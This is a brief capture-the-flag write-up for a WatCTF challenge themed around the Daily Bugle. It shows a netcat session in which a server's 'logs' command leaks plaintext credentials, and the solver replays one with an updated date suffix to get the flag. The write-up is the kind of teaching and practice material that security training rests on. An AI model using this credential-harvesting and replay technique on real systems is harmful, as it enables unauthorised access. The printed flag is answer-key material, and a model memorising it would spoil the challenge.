# web-slinger-logs

```
W. Wonah Wameson here! That wall-crawling menace Spider-Man has been spotted near our secure Daily Bugle authentication servers! Our IT department claims their new password-based login system is "foolproof" - but I have my doubts. Word on the street is that Spider-Man's been swinging around, potentially capturing login credentials mid-air with his web-shooters!

Your mission, should you choose to accept it (and not end up as front-page news), is to investigate this web of security vulnerabilities. The server appears to be leaking sensitive information faster than Peter Parker runs from responsibility!
nc challs.watctf.org 8000 
```

Visit the server, we can get the logs with username and password in plaintext. The suffix of the password is the login date, so just change it to login in successfully

```shell
$ nc challs.watctf.org 8000
Daily Bugle Authentication System
============================================================
Commands:
  logs
  login <username> <password>
  exit
============================================================
> logs
{
  "timestamp": "2025-09-11T05:02:57.541382",
  "login_attempts": [
    {
      "timestamp": "2025-09-08T08:15:23",
      "date": "2025-09-08",
      "user": "admin",
      "password": "admin123",
      "type": "login_attempt",
      "status": "failed",
      "reason": "invalid_credentials"
    },
    {
      "timestamp": "2025-09-09T09:22:45",
      "date": "2025-09-09",
      "user": "test1",
      "password": "securepass2024_2025-09-09",
      "type": "login_attempt",
      "status": "success",
      "reason": "valid_credentials"
    },
    {
      "timestamp": "2025-09-08T10:33:12",
      "date": "2025-09-08",
      "user": "guest",
      "password": "guest",
      "type": "login_attempt",
      "status": "failed",
      "reason": "account_locked"
    },
    {
      "timestamp": "2025-09-06T11:44:56",
      "date": "2025-09-06",
      "user": "test2",
      "password": "mypassword456_2025-09-06",
      "type": "login_attempt",
      "status": "success",
      "reason": "valid_credentials"
    },
    {
      "timestamp": "2025-09-05T12:55:33",
      "date": "2025-09-05",
      "user": "service",
      "password": "wrongpass",
      "type": "login_attempt",
      "status": "failed",
      "reason": "invalid_credentials"
    },
    {
      "timestamp": "2025-09-08T13:16:07",
      "date": "2025-09-08",
      "user": "test3",
      "password": "hunter2021_2025-09-08",
      "type": "login_attempt",
      "status": "success",
      "reason": "valid_credentials"
    }
  ],
  "recent_logins": [],
  "message": "System logs - FOR DEBUGGING ONLY"
}
> login test3 hunter2021_2025-09-11
{
  "Status": "200",
  "Message": "Replay attack successful",
  "flag": "watctf{web_slinger_replay_2025}"
}
>
```
